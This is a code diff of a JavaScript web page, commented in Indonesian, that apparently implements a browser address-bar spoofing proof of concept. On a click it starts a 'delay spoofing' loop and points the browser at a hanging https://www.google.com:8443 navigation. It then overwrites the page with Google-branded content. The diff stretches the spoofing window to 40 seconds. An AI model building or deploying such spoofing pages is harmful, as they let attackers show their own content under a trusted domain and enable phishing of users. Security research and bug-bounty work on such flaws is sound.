@@ -56,8 +56,8 @@
   function raceTick(source) {
     if (!active) return;
     ticks++;
-    if (ticks % 150 === 0) {
-      log("delay_race (" + source + ") -> ticks=" + ticks);
+    if (ticks % 200 === 0) {
+      log("delay_40s (" + source + ") -> ticks=" + ticks);
     }
   }
 
@@ -76,14 +76,12 @@
   btn.addEventListener('click', function() {
     active = true;
     ticks = 0;
-    log("[*] Memulai extended delay spoofing...");
+    log("[*] Memulai delay spoofing (40s)...");
     requestAnimationFrame(raceLoop);
 
     // ============================================
     // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
     // ============================================
-    // Ini akan menggantung karena port 8443 tertutup.
-    // Address bar akan menampilkan google.com:8443 saat pending.
     try {
       window.location.href = "https://www.google.com:8443";
     } catch (e) {
@@ -92,29 +90,28 @@
     }
 
     // ============================================
-    // 3. SELAMA DELAY, TAMPILKAN STATUS DIAGNOSIS
+    // 3. SELAMA DELAY 40 DETIK, PANTAU STATUS DIAGNOSIS
     // ============================================
-    // Jeda diperpanjang menjadi 3000ms (3 detik) sebelum memperbarui tampilan probe
     setTimeout(function() {
       if (!active) return;
       document.body.innerHTML = `
         <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
           <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-          <h2 style="color:#333;margin-bottom:10px;">Extended Pending Probe</h2>
-          <p style="color:#666;font-size:14px;margin-bottom:20px;">Observing extended delay toward https://www.google.com:8443</p>
-          <div id="probeInfo" style="font-family:monospace;font-size:12px;color:#333;background:#f4f4f4;padding:12px;border-radius:6px;">Delay ticks recorded: ${ticks}</div>
-          <div style="margin-top:15px;font-size:11px;color:#666;">Extended delay diagnostic test.</div>
+          <h2 style="color:#333;margin-bottom:10px;">40s Pending Probe</h2>
+          <p style="color:#666;font-size:14px;margin-bottom:20px;">Observing 40-second delay toward https://www.google.com:8443</p>
+          <div id="probeInfo" style="font-family:monospace;font-size:12px;color:#333;background:#f4f4f4;padding:12px;border-radius:6px;">Active delay ticks: ${ticks}</div>
+          <div style="margin-top:15px;font-size:11px;color:#666;">40-second diagnostic delay test.</div>
         </div>
       `;
 
-      // Jeda lanjutan diperpanjang menjadi 8000ms (8 detik) sebelum alih ke https://www.google.com
+      // Jeda 40000ms (40 detik) sebelum alih ke https://www.google.com
       setTimeout(function() {
         active = false;
-        window.location.href = 'https://www.google.com';
-      }, 8000);
+        window.location.href = 'https://www.google.com:8443';
+      }, 40000);
 
-      log("[+] Extended delay probe aktif (3s initial / 8s follow-up)...");
-    }, 3000);
+      log("[+] Probe aktif dengan delay 40 detik...");
+    }, 1000);
 
   }, { once: true });
 
